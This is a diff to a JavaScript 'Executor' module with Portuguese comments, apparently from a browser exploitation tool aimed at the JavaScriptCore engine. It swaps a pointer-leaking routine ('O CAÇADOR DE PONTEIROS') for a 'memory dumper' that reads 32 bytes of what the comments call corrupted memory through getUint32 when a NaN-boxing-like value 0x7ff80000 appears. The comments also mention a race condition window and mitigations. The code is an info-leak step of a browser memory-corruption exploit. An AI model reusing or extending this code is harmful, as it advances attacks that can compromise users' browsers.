@@ -55,21 +55,27 @@ export const Executor = {
                                     // ==========================================
                                     // O CAÇADOR DE PONTEIROS (EXTRAÇÃO LOW BITS)
                                     // ==========================================
+                                    // ==========================================
+                                    // O MEMORY DUMPER (DESPEJO HEXADECIMAL)
+                                    // ==========================================
                                     if (result === 0x7ff80000 && typeof obj.getUint32 === 'function') {
                                         try {
-                                            // Tenta ler os próximos 4 bytes IMEDIATAMENTE (Little-Endian)
-                                            let lowBits = obj.getUint32(4, true); 
+                                            let dump = [];
+                                            // Vamos ler 32 bytes da memória corrompida (8 blocos de 4 bytes)
+                                            for(let offset = 0; offset < 32; offset += 4) {
+                                                let val = obj.getUint32(offset, true);
+                                                dump.push("0x" + val.toString(16).padStart(8, '0'));
+                                            }
                                             
-                                            let realAddress = "0x" + lowBits.toString(16).padStart(8, '0');
-                                            
-                                            // Concatena o High (7ff80000) com o Low
-                                            let fullPointer = `0x7ff80000${lowBits.toString(16).padStart(8, '0')}`;
-                                            
-                                            anomaly.reason += `<br><br><span style="color:#00ffff; font-size:14px; background:#002222; padding:4px;">[$$$] SUCESSO! PONTEIRO JSC REAL: ${fullPointer}</span>`;
+                                            anomaly.reason += `<br><br><span style="color:#00ffff; font-size:12px; background:#002222; padding:4px; display:block; font-family:monospace;">
+                                                [$$$] DUMP DE MEMÓRIA (32 Bytes):<br>
+                                                ${dump.join(' | ')}
+                                            </span>`;
                                         } catch(e) {
-                                            anomaly.reason += `<br><span style="color:#ff8800;">[!] Falha ao ler os low bits: Mitigação fechou a janela da Race Condition.</span>`;
+                                            anomaly.reason += `<br><span style="color:#ff8800;">[!] Mitigação fechou a janela de leitura.</span>`;
                                         }
                                     }
+                                    // ==========================================
                                     // ==========================================
 
                                     yield { type: 'ANOMALY', api: `${target.name}.${prop}`, ...anomaly };
